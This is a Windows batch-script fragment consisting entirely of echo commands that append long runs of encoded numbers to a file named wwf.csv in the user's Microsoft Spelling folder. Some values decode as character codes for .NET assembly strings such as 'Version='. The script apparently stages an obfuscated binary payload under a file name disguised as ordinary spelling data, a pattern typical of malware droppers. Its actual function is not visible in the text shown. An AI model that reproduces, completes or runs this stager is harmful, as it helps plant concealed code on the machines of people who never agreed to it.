>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3044.397;0.632;98.50;55.0655;40.98;70.100;50.55;4967.60;54.70;55.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.8647;40.98;70.57;50.55;0109.70;55.70;98.60;100.6447;70.56;50.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.128;3843.878;65.50;83.40;80.3922;70.46;30.66;60.114;6093.60;111.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(119.60;115.2644;50.101;60.114;70.67;6429.30;97.60;112.70;115.0345;40.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.97;70.99;8286.60;116.40;111.40;114.8277;70.121;60.44;70.32;2946.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.50;101.60;114.0267;30.115;40.105;50.111;8200.40;110.70;61.30;52.9660;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.46;30.48;60.46;5665.40;48.70;46.70;48.9853;40.44;60.32;60.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6634.50;117.30;108.40;116.0540;40.117;30.114;50.101;6516.60;61.30;110.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.7551;70.117;50.116;70.114;1514.60;97.70;108.40;44.0479;70.32;30.80;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.117;3341.70;98.30;108.40;105.6854;50.99;30.75;30.101;4532.50;121.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(84.70;111.5962;30.107;70.101;70.110;3079.30;61.40;98.50;55.0961;40.98;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.100;70.55;5291.30;54.60;55.60;56.7612;40.98;30.57;60.55;3779.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(55.50;98.30;100.6428;40.56;60.102;60.128;2154.876;77.50;105.70;99.8848;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.114;50.111;30.115;7626.40;111.30;102.40;116.6094;50.46;50.86;50.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8091.50;68.60;101.60;115.2569;40.105;70.103;40.110;6677.70;101.30;114.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(44.1199;50.32;30.86;40.101;4055.70;114.40;115.70;105.1502;40.111;70.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.61;5134.60;49.40;48.40;46.2934;70.48;40.46;40.48;8193.60;46.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.60;44.4480;70.32;40.67;40.117;4605.50;108.70;116.40;117.7120;70.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.101;30.61;9079.50;110.50;101.40;117.6684;40.116;30.114;70.97;7684.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.60;44.40;32.7672;60.80;70.117;40.98;5029.30;108.40;105.70;99.5788;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.75;70.101;30.121;9041.50;84.50;111.70;107.8796;50.101;50.110;40.61;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3098.70;98.40;48.30;51.1339;30.102;60.53;40.102;1966.50;55.50;102.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.2635;30.49;70.100;70.53;4526.40;48.30;97.40;51.7002;40.97;70.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(888.77;9204.30;105.30;99.30;114.5332;60.111;50.115;60.111;5368.50;102.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.30;46.5023;40.86;40.105;50.115;1414.30;117.30;97.30;108.5231;60.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.116;30.117;2940.60;100.60;105.70;111.9104;70.46;30.87;40.101;2173.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.60;44.60;32.9943;30.86;60.101;40.114;1821.30;115.60;105.40;111.2382;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.110;40.61;30.49;2638.40;48.60;46.30;48.4217;40.46;30.48;40.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5716.30;48.60;44.30;32.5942;50.67;60.117;60.108;8343.50;116.30;117.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.9281;40.101;70.61;50.110;1033.60;101.50;117.30;116.6788;60.114;40.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.108;6336.30;44.60;32.60;80.8531;60.117;30.98;40.108;3653.40;105.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.50;75.0572;70.101;30.121;40.84;6450.60;111.60;107.30;101.1354;70.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.61;30.98;0186.40;48.40;51.30;102.9673;70.53;70.102;50.55;4989.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.70;49.70;49.7473;60.100;70.53;30.48;3196.60;97.50;51.40;97.3867;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.128;890.77;30.105;3439.40;99.50;114.50;111.5415;50.115;40.111;60.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0635.30;116.60;46.40;87.7785;60.101;30.98;40.46;3920.50;68.50;101.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.4128;70.105;70.103;40.110;5926.50;46.30;67.70;108.6215;60.105;50.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.110;7313.50;116.60;44.50;32.4711;50.86;50.101;50.114;2211.60;115.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.50;111.6182;70.110;70.61;70.49;3027.60;48.40;46.50;48.8422;70.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.48;30.46;6166.70;48.70;44.50;32.1568;50.67;60.117;40.108;9996.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.60;117.60;114.4506;30.101;50.61;40.110;0194.60;101.30;117.30;116.2232;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.114;70.97;50.108;1119.70;44.70;32.70;80.3293;70.117;60.98;60.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3148.60;105.60;99.70;75.9996;30.101;30.121;70.84;9886.50;111.70;107.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.7593;50.110;70.61;30.98;2972.30;48.40;51.60;102.1093;40.53;60.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.55;7768.60;102.60;49.40;49.1093;60.100;60.53;30.48;6008.60;97.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(51.50;97.1000;40.128;888.77;30.105;2628.50;99.60;114.30;111.9147;40.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.111;50.102;8571.30;116.40;46.70;86.1999;30.83;30.68;40.101;6292.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.70;105.40;103.8413;40.110;50.101;50.114;8782.30;46.40;77.40;111.4779;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.98;60.105;50.108;7762.50;101.40;44.40;32.7927;60.86;70.101;70.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7709.60;115.60;105.50;111.2437;30.110;70.61;70.56;5381.60;46.40;48.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.3352;30.48;40.46;60.48;7926.40;44.60;32.40;67.3261;70.117;40.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.116;6165.70;117.40;114.30;101.6252;40.61;30.110;50.101;4560.60;117.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.50;114.9330;50.97;70.108;50.44;3849.30;32.60;80.30;117.1225;50.98;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.108;60.105;2577.50;99.40;75.40;101.2605;70.121;70.84;40.111;5715.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(107.50;101.70;110.4821;30.61;50.98;60.48;6218.60;51.40;102.60;53.5251;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.102;50.55;30.102;1420.70;49.40;49.50;100.0628;50.53;40.48;60.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0494.60;51.40;97.70;128.4987;868.77;50.105;70.99;5449.30;114.60;111.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.7986;60.111;30.102;60.116;1132.70;46.30;74.30;83.9927;40.99;30.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.105;1670.50;112.30;116.50;44.6719;50.32;60.86;60.101;9947.60;114.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.40;105.4524;40.111;30.110;40.61;2859.60;56.50;46.30;48.6969;40.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.48;50.46;8390.30;48.40;44.40;32.7279;30.67;60.117;60.108;6222.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.70;117.40;114.9806;30.101;70.61;50.110;6148.50;101.30;117.50;116.0143;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.114;60.97;30.108;2842.60;44.50;32.40;80.9664;50.117;60.98;30.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8553.30;105.70;99.70;75.9058;70.101;40.121;60.84;4603.70;111.70;107.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.3327;50.110;60.61;70.98;8792.50;48.50;51.30;102.5562;70.53;50.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.55;0383.40;102.30;49.60;49.3294;70.100;30.53;50.48;2830.30;97.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(51.40;97.0228;50.4;30.0;40.0;6926.44;1.30;0.30;30.6631;767.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;809.0;2194.812;0.805;0.808;0.7794;801.0;814.0;686.0;7194.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.815;0.4856;805.0;811.0;810.0;4867.63;6.418;8.63;6.6815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(418.93;62.6;48.3;8840.56;18.324;3.76;18.7583;728.3;56.18;532.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8334.46;18.436;3.46;18.4372;440.3;36.18;744.3;8782.66;18.348;3.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(18.9418;452.3;46.18;456.3;5543.76;18.660;3.66;18.0114;364.3;46.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(768.3;2522.66;18.472;3.36;18.4880;376.3;76.18;380.3;7568.36;18.384;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.76;18.1752;388.3;36.18;392.3;1092.76;18.817;8.36;21.9743;318.121;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.14;518.96;2223.68;6.321;18.828;141.7952;71.18;396.3;76.17;8288.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(18.56;21.618;128.0470;877.2;418.128;829.21;4261.618;128.877;2.614;18.2147;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(828.181;72.6;528.4;3600.70;0.718;8.36;0.3023;62.14;314.29;528.8;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2384.40;3.514;18.801;14.6288;629.28;46.0;42.14;7689.518;101.514;4.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5279;418.24;75.32;71.1;0463.518;105.74;0.70;18.4547;328.6;632.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(418.117;2453.418;105.74;0.50;18.0996;532.4;40.0;718.36;0236.34;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(18.540;4.0419;50.0;718.44;64.0;4310.50;18.348;4.30;0.1116;418.52;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(64.0;40.18;2828.356;4.70;0.618;60.1452;44.0;50.18;664.4;0132.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.718;68.74;0.1257;50.18;772.4;40.0;7557.618;76.64;0.40;18.0480;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(780.4;70.0;518.84;0549.34;0.70;18.588;4.5780;60.0;418.92;46.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2578.52;2.314;29.714;12.0831;40.2;31.29;314.21;5370.418;121.72;14.418;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(96.0501;38.0;53.1;314.16;1508.714;16.514;6.60;2.6542;62.14;716.14;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.0;8745.31;14.518;128.829;5.5721;30.1;71.18;796.5;6000.60;1.38;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(29.314;8.3710;30.1;418.128;881.18;8828.828;129.39;0.32;18.2495;828.181;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(718.128;829.14;9814.77;0.71;18.828;181.8224;717.112;48.0;52.18;8556.828;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(181.317;112.614;7.1254;70.1;417.112;718.128;7228.885;5.60;1.717;112.2482;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(714.4;58.0;618.24;3354.74;8.30;18.328;4.1368;58.0;318.32;33.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2976.60;14.54;8.30;18.1198;636.4;48.0;318.40;4153.43;40.70;2.74;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.9519;60.18;544.4;58.0;6675.518;48.44;8.30;18.9005;452.4;78.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(318.56;8897.44;8.30;18.760;4.1567;78.0;518.64;64.8;0191.30;18.668;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.78;0.3773;518.72;44.8;50.18;4348.476;4.78;0.518;80.9026;64.8;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.18;684.4;2071.48;0.418;88.44;8.5651;70.18;592.4;440.0;4875.318;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.78;1.60;8.8570;30.0;50.0;30.8;7484.71;0.72;0.60;0.0536;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;55.1;30.0;5156.40;0.65;1.60;1.2172;50.0;612.1;40.7;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9489.819;102.799;46.801;120.1646;801.0;70.26;51.0;3235.621;77.805;99.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.7856;815.111;802.116;332.67;1917.811;114.812;111.814;97.5347;816.105;811.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;2993.531;1.60;26.677;105.5085;599.114;811.115;811.102;3357.816;194.874;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.546;78.5130;469.84;732.70;814.97;2704.809;101.819;111.814;107.6650;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(752.1;30.47;4706.894;169.432;77.805;99.4631;814.111;815.111;802.116;2117.632;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.811;114.812;111.4425;814.97;816.105;811.110;1758.546;32.632;65.808;108.9861;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.114;805.103;804.116;1625.815;32.814;101.815;101.7175;814.118;801.100;546.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4353.30;15.41;0.610;52.6312;546.56;746.51;557.50;7871.456;46.548;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(12.2691;41.0;37.52;746.48;6057.646;48.746;48.50;0.0981;610.1;30.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.110;3774.345;85.783;0.70;45.3611;51.0;340.102;658.92;2803.800;100.392;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.811;111.2681;808.115;792.100;801.118;9977.800;105.818;92.551;53.8600;677.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(383.104;597.114;6613.801;100.776;105.698;49.9877;348.50;752.46;815.110;5912.807;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;131.372;1.5923;30.130;564.48;448.50;4198.652;48.548;48.448;48.0403;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(799.56;448.48;448.48;9513.348;49.452;48.649;48.2717;448.48;648.48;354.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9567.750;48.548;48.748;48.5326;548.50;352.48;548.48;5882.348;53.650;53.751;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.5115;549.51;549.48;748.48;6663.556;48.648;48.548;48.0538;749.48;648.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(549.48;9577.748;56.353;97.697;100.3394;648.98;801.102;448.54;1766.456;56.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.398;57.2177;557.52;597.48;800.55;2734.456;101.649;102.800;50.1508;557.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(699.50;352.97;6873.599;51.352;101.800;51.4413;800.51;497.99;751.102;1612.698;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(57.798;51.800;48.6864;799.52;456.51;656.54;5510.498;97.356;51.452;97.1306;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(497.56;656.48;648.51;8208.753;48.654;48.697;56.8684;356.52;456.98;350.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9486.756;97.800;102.453;56.3591;801.54;355.48;801.100;2327.450;48.557;49.452;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.3744;801.51;354.56;549.97;4808.756;57.449;99.457;99.0096;356.99;548.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.101;5164.802;50.397;98.350;50.8455;556.55;450.53;452.55;4487.399;51.657;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.801;48.5361;748.97;802.48;801.54;4029.499;55.750;52.456;53.7041;800.55;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(799.102;800.49;6399.497;53.749;100.802;56.9270;357.52;755.100;551.54;0210.499;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.698;97.557;57.8908;756.57;649.48;654.98;7177.353;56.797;98.801;55.7048;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(657.101;354.97;451.101;8692.355;49.597;48.349;101.3229;800.54;798.100;399.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3671.754;55.648;49.450;56.1366;656.51;801.48;598.49;6185.597;52.800;51.453;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.4415;649.98;353.101;801.101;9152.800;54.800;102.650;49.8442;801.52;648.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(798.98;7791.748;99.750;50.802;50.9788;750.52;754.99;799.98;9444.354;57.757;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(55.657;100.6447;499.57;801.54;449.101;3375.801;102.350;54.550;56.9301;351.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.100;448.102;2894.450;48.354;52.756;53.8315;351.55;350.53;797.55;8629.653;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.356;53.802;97.4774;556.97;551.101;802.98;4774.755;101.348;50.755;51.1142;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(449.57;799.56;554.100;8172.801;99.448;51.800;99.8400;451.98;749.98;399.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8858.750;98.653;48.456;49.0775;498.97;698.53;650.97;4847.754;50.455;98.557;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(57.4593;749.55;552.53;548.100;4832.802;97.800;53.551;52.1400;655.57;557.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(649.99;0425.355;97.802;53.356;54.0698;556.51;598.100;802.97;5330.449;51.653;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.549;53.7186;649.56;802.102;349.101;4444.397;54.548;101.357;48.5253;800.55;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(598.57;457.51;8453.397;54.499;56.455;102.7957;800.51;800.100;457.51;4911.552;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.456;101.551;53.3954;800.49;350.57;354.102;2729.557;97.555;102.457;97.8420;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(457.55;599.53;800.98;6127.653;54.799;48.802;51.0437;599.99;350.53;497.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2265.549;49.801;57.655;55.9818;755.102;457.52;800.49;7047.451;56.398;51.399;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.9744;697.53;451.98;657.97;6140.356;51.351;49.399;50.4428;801.54;800.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(398.56;3811.800;50.801;97.657;52.4445;801.49;556.98;802.49;2703.349;54.551;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.802;49.9730;449.50;797.50;450.100;5973.798;100.657;50.800;52.5604;350.57;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.129;60.56;4961.457;49.651;101.802;56.9981;554.57;454.52;754.100;1375.549;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.357;55.649;100.7191;802.50;650.50;499.50;1101.649;48.548;49.756;97.7547;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(798.51;457.52;599.102;8746.801;54.351;102.656;101.6080;398.57;598.52;800.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8875.357;52.599;48.800;100.6760;397.55;751.54;356.99;4942.802;98.554;57.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.8987;549.53;800.48;652.57;3541.498;51.452;55.802;56.7517;497.56;698.57;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(550.48;2191.453;99.800;99.399;51.0696;800.54;598.100;654.54;6767.657;48.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.498;100.7972;450.52;798.51;800.97;2972.651;49.655;57.802;101.2278;498.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(799.48;351.102;1621.552;49.548;55.748;51.5644;448.50;455.99;655.56;3831.652;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.802;102.354;53.7703;352.57;657.55;801.51;5887.456;48.749;53.800;102.0670;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(699.57;555.50;450.50;6013.799;49.553;48.354;49.1408;397.102;550.97;349.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9228.751;102.801;57.349;55.8008;455.53;798.57;800.100;7952.652;98.356;101.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.7803;754.52;800.51;800.53;9112.557;56.749;54.450;55.1228;448.97;757.53;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(350.48;0012.801;51.657;51.699;56.6823;801.54;548.54;449.57;5751.798;56.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.752;48.8005;802.99;449.100;599.52;9345.802;49.750;98.453;97.6820;597.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(599.50;800.102;2503.350;48.800;48.450;101.1363;397.51;350.57;654.48;5880.756;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(53.749;0.70;30.8104;61.0;61.0;384.2;2124.422;87.814;97.812;78.0132;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.110;769.120;699.101;2720.812;116.805;111.810;84.4709;804.114;811.119;815.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1999.48;1.30;2.68;0.5551;50.0;70.98;71.0;1102.693;84.804;101.432;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(87.8299;370.51;732.116;821.112;2298.801;115.632;97.814;101.0009;632.100;801.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.101;8483.799;97.816;101.800;46.4686;632.32;573.110;815.116;2302.801;97.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(44.532;112.8817;808.101;697.115;801.32;6013.817;115.801;32.816;104.1994;801.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.101;819.32;5426.587;70.352;32.816;121.4381;812.101;815.32;802.114;7273.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(109.732;83.821;115.4585;816.101;809.46;565.99;1732.816;105.818;105.816;105.7796;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.115;746.42;40.0;9990.904;34.60;0.906;202.8925;939.190;51.0;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0886.845;0.30;0.808;83.0314;821.115;816.101;809.46;6567.682;101.815;111.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.6892;599.101;815.46;382.101;0325.815;111.817;114.799;101.6621;482.101;797.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.114;4499.744;32.809;115.799;111.3598;814.108;805.98;744.32;8988.786;101.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.805;111.0087;810.61;452.46;748.46;8903.648;46.348;44.532;67.2727;817.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.117;814.101;1092.661;110.801;117.816;114.0269;797.108;544.32;580.117;2162.398;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.805;99.475;101.1442;821.84;811.107;801.110;8388.461;98.355;55.497;53.9029;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(599.53;554.49;657.51;5652.352;101.348;56.757;35.1536;783.121;815.116;801.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6448.446;82.801;115.811;117.7498;814.99;801.115;646.82;9200.817;110.816;105.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.4835;482.101;815.111;817.114;1183.399;101.483;101.816;2.1000;30.0;60.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;5976.70;0.50;0.40;80.0411;765.68;780.65;368.80;8172.830;186.738;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.821;144.2968;858.131;898.213;807.133;9515.950;91.884;134.64;208.4099;862.139;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(951.245;887.141;3761.829;156.395;142.75;159.5563;616.147;929.63;323.150;7712.71;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(168.30;152.62;168.4323;30.152;53.168;50.152;9154.34;168.70;152.35;168.6305;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.152;56.168;60.152;3373.57;168.30;152.78;168.0244;70.152;49.168;60.152;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6839.616;168.321;152.617;168.5901;321.152;718.168;421.152;8479.319;168.321;152.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(90.6383;695.152;557.78;930.153;0961.558;78.930;153.930;53.4351;848.154;870.183;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(665.156;0806.802;241.903;158.908;224.6056;320.161;914.224;320.161;7007.915;224.620;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(161.869;47.2288;841.163;372.180;539.176;0597.884;147.811;177.865;113.2417;867.177;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(926.44;590.179;4857.833;198.626;181.834;198.1243;326.181;630.11;440.197;8916.733;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(252.867;200.856;169.2828;366.211;809.121;932.218;6982.831;70.650;220.952;230.6679;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(761.222;412.149;832.229;8314.315;149.832;229.953;6.7010;447.232;868.159;812.247;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2006.871;159.812;247.872;159.5277;812.247;875.159;812.247;7057.940;199.417;248.941;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(199.7527;717.248;942.199;317.248;0275.921;2.553;250.932;159.4929;469.252;945.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(489.0;5805.336;115.689;0.717;116.8519;689.0;888.145;41.2;6113.809;163.886;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.953;164.1016;835.11;774.24;836.11;8033.456;111.577;12.912;191.8181;909.13;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(916.68;640.16;5331.919;68.540;16.562;78.9992;855.19;552.192;894.28;1913.919;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.926;35.910;24.5367;850.36;730.241;666.51;4585.393;153.621;56.859;228.3710;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(498.58;357.79;820.58;9761.940;98.870;59.880;15.9500;866.61;769.17;878.63;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4130.925;243.904;63.901;198.4525;617.78;628.184;868.79;1203.453;78.942;79.531;
